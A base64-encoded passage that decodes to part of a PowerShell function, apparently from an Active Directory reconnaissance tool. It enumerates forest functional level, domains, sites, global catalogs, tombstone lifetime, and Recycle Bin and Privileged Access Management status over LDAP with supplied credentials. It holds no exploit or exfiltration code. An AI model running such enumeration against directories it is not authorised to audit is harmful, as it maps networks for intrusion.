fQoKICAgICAgICAgICAgJEZvcmVzdE9iaiA9IEAoKQoKICAgICAgICAgICAgIyBWYWx1ZXMgdGFrZW4gZnJvbSBodHRwczovL3RlY2huZXQubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2hoODUyMjgxKHY9d3BzLjYzMCkuYXNweAogICAgICAgICAgICAkRkxBRCA9IEB7CiAgICAgICAgICAgICAgICAwID0gIldpbmRvd3MyMDAwIjsKICAgICAgICAgICAgICAgIDEgPSAiV2luZG93czIwMDMvSW50ZXJpbSI7CiAgICAgICAgICAgICAgICAyID0gIldpbmRvd3MyMDAzIjsKICAgICAgICAgICAgICAgIDMgPSAiV2luZG93czIwMDgiOwogICAgICAgICAgICAgICAgNCA9ICJXaW5kb3dzMjAwOFIyIjsKICAgICAgICAgICAgICAgIDUgPSAiV2luZG93czIwMTIiOwogICAgICAgICAgICAgICAgNiA9ICJXaW5kb3dzMjAxMlIyIjsKICAgICAgICAgICAgICAgIDcgPSAiV2luZG93czIwMTYiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJEZvcmVzdE1vZGUgPSAkRkxBRFtbY29udmVydF06OlRvSW50MzIoJEFERm9yZXN0LkZvcmVzdE1vZGUpXSArICJGb3Jlc3QiCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBGTEFECgogICAgICAgICAgICBJZiAoLU5vdCAkRm9yZXN0TW9kZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEZvcmVzdE1vZGUgPSAkQURGb3Jlc3QuRm9yZXN0TW9kZQogICAgICAgICAgICB9CgogICAgICAgICAgICAkT2JqVmFsdWVzID0gQCgiTmFtZSIsICRBREZvcmVzdC5OYW1lLCAiRnVuY3Rpb25hbCBMZXZlbCIsICRGb3Jlc3RNb2RlLCAiRG9tYWluIE5hbWluZyBNYXN0ZXIiLCAkQURGb3Jlc3QuRG9tYWluTmFtaW5nTWFzdGVyLCAiU2NoZW1hIE1hc3RlciIsICRBREZvcmVzdC5TY2hlbWFNYXN0ZXIsICJSb290RG9tYWluIiwgJEFERm9yZXN0LlJvb3REb21haW4sICJEb21haW4gQ291bnQiLCAkQURGb3Jlc3QuRG9tYWlucy5Db3VudCwgIlNpdGUgQ291bnQiLCAkQURGb3Jlc3QuU2l0ZXMuQ291bnQsICJHbG9iYWwgQ2F0YWxvZyBDb3VudCIsICRBREZvcmVzdC5HbG9iYWxDYXRhbG9ncy5Db3VudCkKCiAgICAgICAgICAgIEZvciAoJGkgPSAwOyAkaSAtbHQgJCgkT2JqVmFsdWVzLkNvdW50KTsgJGkrKykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiQ2F0ZWdvcnkiIC1WYWx1ZSAkT2JqVmFsdWVzWyRpXQogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJWYWx1ZSIgLVZhbHVlICRPYmpWYWx1ZXNbJGkrMV0KICAgICAgICAgICAgICAgICRpKysKICAgICAgICAgICAgICAgICRGb3Jlc3RPYmogKz0gJE9iagogICAgICAgICAgICB9CiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBGb3Jlc3RNb2RlCgogICAgICAgICAgICBGb3IoJGk9MDsgJGkgLWx0ICRBREZvcmVzdC5Eb21haW5zLkNvdW50OyAkaSsrKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkT2JqID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJDYXRlZ29yeSIgLVZhbHVlICJEb21haW4iCiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIlZhbHVlIiAtVmFsdWUgJEFERm9yZXN0LkRvbWFpbnNbJGldCiAgICAgICAgICAgICAgICAkRm9yZXN0T2JqICs9ICRPYmoKICAgICAgICAgICAgfQogICAgICAgICAgICBGb3IoJGk9MDsgJGkgLWx0ICRBREZvcmVzdC5TaXRlcy5Db3VudDsgJGkrKykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiQ2F0ZWdvcnkiIC1WYWx1ZSAiU2l0ZSIKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAkQURGb3Jlc3QuU2l0ZXNbJGldCiAgICAgICAgICAgICAgICAkRm9yZXN0T2JqICs9ICRPYmoKICAgICAgICAgICAgfQogICAgICAgICAgICBGb3IoJGk9MDsgJGkgLWx0ICRBREZvcmVzdC5HbG9iYWxDYXRhbG9ncy5Db3VudDsgJGkrKykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiQ2F0ZWdvcnkiIC1WYWx1ZSAiR2xvYmFsQ2F0YWxvZyIKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAkQURGb3Jlc3QuR2xvYmFsQ2F0YWxvZ3NbJGldCiAgICAgICAgICAgICAgICAkRm9yZXN0T2JqICs9ICRPYmoKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJDYXRlZ29yeSIgLVZhbHVlICJUb21ic3RvbmUgTGlmZXRpbWUiCiAgICAgICAgICAgIElmICgkQURGb3Jlc3RUb21ic3RvbmVMaWZldGltZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJWYWx1ZSIgLVZhbHVlICRBREZvcmVzdFRvbWJzdG9uZUxpZmV0aW1lCiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURGb3Jlc3RUb21ic3RvbmVMaWZldGltZQogICAgICAgICAgICB9CiAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJWYWx1ZSIgLVZhbHVlICJOb3QgUmV0cmlldmVkIgogICAgICAgICAgICB9CiAgICAgICAgICAgICRGb3Jlc3RPYmogKz0gJE9iagoKICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJDYXRlZ29yeSIgLVZhbHVlICJSZWN5Y2xlIEJpbiAoMjAwOCBSMiBvbndhcmRzKSIKICAgICAgICAgICAgSWYgKCRBRFJlY3ljbGVCaW4pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIElmICgkQURSZWN5Y2xlQmluLkVuYWJsZWRTY29wZXMuQ291bnQgLWd0IDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJWYWx1ZSIgLVZhbHVlICJFbmFibGVkIgogICAgICAgICAgICAgICAgICAgICRGb3Jlc3RPYmogKz0gJE9iagogICAgICAgICAgICAgICAgICAgIEZvcigkaT0wOyAkaSAtbHQgJCgkQURSZWN5Y2xlQmluLkVuYWJsZWRTY29wZXMuQ291bnQpOyAkaSsrKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJDYXRlZ29yeSIgLVZhbHVlICJFbmFibGVkIFNjb3BlIgogICAgICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIlZhbHVlIiAtVmFsdWUgJEFEUmVjeWNsZUJpbi5FbmFibGVkU2NvcGVzWyRpXQogICAgICAgICAgICAgICAgICAgICAgICAkRm9yZXN0T2JqICs9ICRPYmoKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBFbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJWYWx1ZSIgLVZhbHVlICJEaXNhYmxlZCIKICAgICAgICAgICAgICAgICAgICAkRm9yZXN0T2JqICs9ICRPYmoKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJlY3ljbGVCaW4KICAgICAgICAgICAgfQogICAgICAgICAgICBFbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAiRGlzYWJsZWQiCiAgICAgICAgICAgICAgICAkRm9yZXN0T2JqICs9ICRPYmoKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJDYXRlZ29yeSIgLVZhbHVlICJQcml2aWxlZ2VkIEFjY2VzcyBNYW5hZ2VtZW50ICgyMDE2IG9ud2FyZHMpIgogICAgICAgICAgICBJZiAoJFByaXZpbGVnZWRBY2Nlc3NNYW5hZ2VtZW50KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBJZiAoJFByaXZpbGVnZWRBY2Nlc3NNYW5hZ2VtZW50LkVuYWJsZWRTY29wZXMuQ291bnQgLWd0IDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJWYWx1ZSIgLVZhbHVlICJFbmFibGVkIgogICAgICAgICAgICAgICAgICAgICRGb3Jlc3RPYmogKz0gJE9iagogICAgICAgICAgICAgICAgICAgIEZvcigkaT0wOyAkaSAtbHQgJCgkUHJpdmlsZWdlZEFjY2Vzc01hbmFnZW1lbnQuRW5hYmxlZFNjb3Blcy5Db3VudCk7ICRpKyspCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkT2JqID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkNhdGVnb3J5IiAtVmFsdWUgIkVuYWJsZWQgU2NvcGUiCiAgICAgICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAkUHJpdmlsZWdlZEFjY2Vzc01hbmFnZW1lbnQuRW5hYmxlZFNjb3Blc1skaV0KICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVzdE9iaiArPSAkT2JqCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgRWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAiRGlzYWJsZWQiCiAgICAgICAgICAgICAgICAgICAgJEZvcmVzdE9iaiArPSAkT2JqCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgUHJpdmlsZWdlZEFjY2Vzc01hbmFnZW1lbnQKICAgICAgICAgICAgfQogICAgICAgICAgICBFbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAiRGlzYWJsZWQiCiAgICAgICAgICAgICAgICAkRm9yZXN0T2JqICs9ICRPYmoKICAgICAgICAgICAgfQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURGb3Jlc3QKICAgICAgICB9CiAgICB9CgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0xEQVAnKQogICAgewogICAgICAgIElmICgkQ3JlZGVudGlhbCAtbmUgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSkKICAgICAgICB7CiAgICAgICAgICAgICREb21haW5GUUROID0gR2V0LUROdG9GUUROKCRvYmpEb21haW4uZGlzdGluZ3Vpc2hlZE5hbWUpCiAgICAgICAgICAgICREb21haW5Db250ZXh0ID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRpcmVjdG9yeUNvbnRleHQoIkRvbWFpbiIsJCgkRG9tYWluRlFETiksJCgkQ3JlZGVudGlhbC5Vc2VyTmFtZSksJCgkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLnBhc3N3b3JkKSkKICAgICAgICAgICAgVHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRBRERvbWFpbiA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRvbWFpbl06OkdldERvbWFpbigkRG9tYWluQ29udGV4dCkKICAgICAgICAgICAgfQogICAgICAgICAgICBDYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkZvcmVzdF0gRXJyb3IgZ2V0dGluZyBEb21haW4gQ29udGV4dCIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIERvbWFpbkNvbnRleHQKCiAgICAgICAgICAgICRGb3Jlc3RDb250ZXh0ID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRpcmVjdG9yeUNvbnRleHQoIkZvcmVzdCIsJCgkQUREb21haW4uRm9yZXN0KSwkKCRDcmVkZW50aWFsLlVzZXJOYW1lKSwkKCRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkucGFzc3dvcmQpKQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQUREb21haW4KICAgICAgICAgICAgVHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRBREZvcmVzdCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkZvcmVzdF06OkdldEZvcmVzdCgkRm9yZXN0Q29udGV4dCkKICAgICAgICAgICAgfQogICAgICAgICAgICBDYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkZvcmVzdF0gRXJyb3IgZ2V0dGluZyBGb3Jlc3QgQ29udGV4dCIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEZvcmVzdENvbnRleHQKCiAgICAgICAgICAgICMgR2V0IFRvbWJzdG9uZSBMaWZldGltZQogICAgICAgICAgICBUcnkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNlYXJjaFBhdGggPSAiQ049RGlyZWN0b3J5IFNlcnZpY2UsQ049V2luZG93cyBOVCxDTj1TZXJ2aWNlcyIKICAgICAgICAgICAgICAgICRvYmpTZWFyY2hQYXRoID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnkgIkxEQVA6Ly8kKCREb21haW5Db250cm9sbGVyKS8kU2VhcmNoUGF0aCwkKCRvYmpEb21haW5Sb290RFNFLmNvbmZpZ3VyYXRpb25OYW1pbmdDb250ZXh0KSIsICRDcmVkZW50aWFsLlVzZXJOYW1lLCRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkuUGFzc3dvcmQKICAgICAgICAgICAgICAgICRvYmpTZWFyY2hlclBhdGggPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlciAkb2JqU2VhcmNoUGF0aAogICAgICAgICAgICAgICAgJG9ialNlYXJjaGVyUGF0aC5GaWx0ZXI9IihuYW1lPURpcmVjdG9yeSBTZXJ2aWNlKSIKICAgICAgICAgICAgICAgICRvYmpTZWFyY2hlclJlc3VsdCA9ICRvYmpTZWFyY2hlclBhdGguRmluZEFsbCgpCiAgICAgICAgICAgICAgICAkQURGb3Jlc3RUb21ic3RvbmVMaWZldGltZSA9ICRvYmpTZWFyY2hlclJlc3VsdC5Qcm9wZXJ0aWVzLnRvbWJzdG9uZUxpZmV0aW1lCiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgU2VhcmNoUGF0aAogICAgICAgICAgICAgICAgJG9ialNlYXJjaFBhdGguRGlzcG9zZSgpCiAgICAgICAgICAgICAgICAkb2JqU2VhcmNoZXJQYXRoLkRpc3Bvc2UoKQogICAgICAgICAgICAgICAgJG9ialNlYXJjaGVyUmVzdWx0LkRpc3Bvc2UoKQogICAgICAgICAgICB9CiAgICAgICAgICAgIENhdGNoCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSRm9yZXN0XSBFcnJvciByZXRyaWV2aW5nIFRvbWJzdG9uZSBMaWZldGltZSIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICB9CiAgICAgICAgICAgICMgQ2hlY2sgUmVjeWNsZSBCaW4gRmVhdHVyZSBTdGF0dXMKICAgICAgICAgICAgSWYgKFtjb252ZXJ0XTo6VG9JbnQzMigkb2JqRG9tYWluUm9vdERTRS5mb3Jlc3RGdW5jdGlvbmFsaXR5LDEwKSAtZ2UgNikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFNlYXJjaFBhdGggPSAiQ049UmVjeWNsZSBCaW4gRmVhdHVyZSxDTj1PcHRpb25hbCBGZWF0dXJlcyxDTj1EaXJlY3RvcnkgU2VydmljZSxDTj1XaW5kb3dzIE5ULENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24iCiAgICAgICAgICAgICAgICAgICAgJG9ialNlYXJjaFBhdGggPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeSAiTERBUDovLyQoJERvbWFpbkNvbnRyb2xsZXIpLyQoJFNlYXJjaFBhdGgpLCQoJG9iakRvbWFpbi5kaXN0aW5ndWlzaGVkTmFtZSkiLCAkQ3JlZGVudGlhbC5Vc2VyTmFtZSwkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLlBhc3N3b3JkCiAgICAgICAgICAgICAgICAgICAgJG9ialNlYXJjaGVyUGF0aCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeVNlYXJjaGVyICRvYmpTZWFyY2hQYXRoCiAgICAgICAgICAgICAgICAgICAgJEFEUmVjeWNsZUJpbiA9ICRvYmpTZWFyY2hlclBhdGguRmluZEFsbCgpCiAgICAgICAgICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIFNlYXJjaFBhdGgKICAgICAgICAgICAgICAgICAgICAkb2JqU2VhcmNoUGF0aC5EaXNwb3NlKCkKICAgICAgICAgICAgICAgICAgICAkb2JqU2VhcmNoZXJQYXRoLkRpc3Bvc2UoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkZvcmVzdF0gRXJyb3IgcmV0cmlldmluZyBSZWN5Y2xlIEJpbiBGZWF0dXJlIgogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICMgQ2hlY2sgUHJpdmlsZWdlZCBBY2Nlc3MgTWFuYWdlbWVudCBGZWF0dXJlIHN0YXR1cwogICAgICAgICAgICBJZiAoW2NvbnZlcnRdOjpUb0ludDMyKCRvYmpEb21haW5Sb290RFNFLmZvcmVzdEZ1bmN0aW9uYWxpdHksMTApIC1nZSA3KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUcnkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkU2VhcmNoUGF0aCA9ICJDTj1Qcml2aWxlZ2VkIEFjY2VzcyBNYW5hZ2VtZW50IEZlYXR1cmUsQ049T3B0aW9uYWwgRmVhdHVyZXMsQ049RGlyZWN0b3J5IFNlcnZpY2UsQ049V2luZG93cyBOVCxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uIgogICAgICAgICAgICAgICAgICAgICRvYmpTZWFyY2hQYXRoID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnkgIkxEQVA6Ly8kKCREb21haW5Db250cm9sbGVyKS8kKCRTZWFyY2hQYXRoKSwkKCRvYmpEb21haW4uZGlzdGluZ3Vpc2hlZE5hbWUpIiwgJENyZWRlbnRpYWwuVXNlck5hbWUsJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5QYXNzd29yZAogICAgICAgICAgICAgICAgICAgICRvYmpTZWFyY2hlclBhdGggPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlciAkb2JqU2VhcmNoUGF0aAogICAgICAgICAgICAgICAgICAgICRQcml2aWxlZ2VkQWNjZXNzTWFuYWdlbWVudCA9ICRvYmpTZWFyY2hlclBhdGguRmluZEFsbCgpCiAgICAgICAgICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIFNlYXJjaFBhdGgKICAgICAgICAgICAgICAgICAgICAkb2JqU2VhcmNoUGF0aC5EaXNwb3NlKCkKICAgICAgICAgICAgICAgICAgICAkb2JqU2VhcmNoZXJQYXRoLkRpc3Bvc2UoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkZvcmVzdF0gRXJyb3IgcmV0cmlldmluZyBQcml2aWxlZ2VkIEFjY2VzcyBNYW5hZ2VtZW50IEZlYXR1cmUiCiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgRWxzZQogICAgICAgIHsKICAgICAgICAgICAgJEFERG9tYWluID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluXTo6R2V0Q3VycmVudERvbWFpbigpCiAgICAgICAgICAgICRBREZvcmVzdCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkZvcmVzdF06OkdldEN1cnJlbnRGb3Jlc3QoKQoKICAgICAgICAgICAgIyBHZXQgVG9tYnN0b25lIExpZmV0aW1lCiAgICAgICAgICAgICRBREZvcmVzdFRvbWJzdG9uZUxpZmV0aW1lID0gKFtBRFNJXSJMREFQOi8vQ049RGlyZWN0b3J5IFNlcnZpY2UsQ049V2luZG93cyBOVCxDTj1TZXJ2aWNlcywkKCRvYmpEb21haW5Sb290RFNFLmNvbmZpZ3VyYXRpb25OYW1pbmdDb250ZXh0KSIpLnRvbWJzdG9uZUxpZmV0aW1lLnZhbHVlCgogICAgICAgICAgICAjIENoZWNrIFJlY3ljbGUgQmluIEZlYXR1cmUgU3RhdHVzCiAgICAgICAgICAgIElmIChbY29udmVydF06OlRvSW50MzIoJG9iakRvbWFpblJvb3REU0UuZm9yZXN0RnVuY3Rpb25hbGl0eSwxMCkgLWdlIDYpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRBRFJlY3ljbGVCaW4gPSAoW0FEU0ldIkxEQVA6Ly9DTj1SZWN5Y2xlIEJpbiBGZWF0dXJlLENOPU9wdGlvbmFsIEZlYXR1cmVzLENOPURpcmVjdG9yeSBTZXJ2aWNlLENOPVdpbmRvd3MgTlQsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbiwkKCRvYmpEb21haW4uZGlzdGluZ3Vpc2hlZE5hbWUpIikKICAgICAgICAgICAgfQogICAgICAgICAgICAjIENoZWNrIFByaXZpbGVnZWQgQWNjZXNzIE1hbmFnZW1lbnQgRmVhdHVyZSBTdGF0dXMKICAgICAgICAgICAgSWYgKFtjb252ZXJ0XTo6VG9JbnQzMigkb2JqRG9tYWluUm9vdERTRS5mb3Jlc3RGdW5jdGlvbmFsaXR5LDEwKSAtZ2UgNykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFByaXZpbGVnZWRBY2Nlc3NNYW5hZ2VtZW50ID0gKFtBRFNJXSJMREFQOi8vQ049UHJpdmlsZWdlZCBBY2Nlc3MgTWFuYWdlbWVudCBGZWF0dXJlLENOPU9wdGlvbmFsIEZlYXR1cmVzLENOPURpcmVjdG9yeSBTZXJ2aWNlLENOPVdpbmRvd3MgTlQsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbiwkKCRvYmpEb21haW4uZGlzdGluZ3Vpc2hlZE5hbWUpIikKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgSWYgKCRBREZvcmVzdCkKICAgICAgICB7CiAgICAgICAgICAgICRGb3Jlc3RPYmogPSBAKCkKCiAgICAgICAgICAgICMgVmFsdWVzIHRha2VuIGZyb20gaHR0cHM6Ly90ZWNobmV0Lm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9oaDg1MjI4MSh2PXdwcy42MzApLmFzcHgKICAgICAgICAgICAgJEZMQUQgPSBAewoJICAgICAgICAgICAgMCA9ICJXaW5kb3dzMjAwMCI7CgkgICAgICAgICAgICAxID0gIldpbmRvd3MyMDAzL0ludGVyaW0iOwoJICAgICAgICAgICAgMiA9ICJXaW5kb3dzMjAwMyI7CgkgICAgICAgICAgICAzID0gIldpbmRvd3MyMDA4IjsKCSAgICAgICAgICAgIDQgPSAiV2luZG93czIwMDhSMiI7CgkgICAgICAgICAgICA1ID0gIldpbmRvd3MyMDEyIjsKCSAgICAgICAgICAgIDYgPSAiV2luZG93czIwMTJSMiI7CiAgICAgICAgICAgICAgICA3ID0gIldpbmRvd3MyMDE2IgogICAgICAgICAgICB9CiAgICAgICAgICAgICRGb3Jlc3RNb2RlID0gJEZMQURbW2NvbnZlcnRdOjpUb0ludDMyKCRvYmpEb21haW5Sb290RFNFLmZvcmVzdEZ1bmN0aW9uYWxpdHksMTApXSArICJGb3Jlc3QiCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJs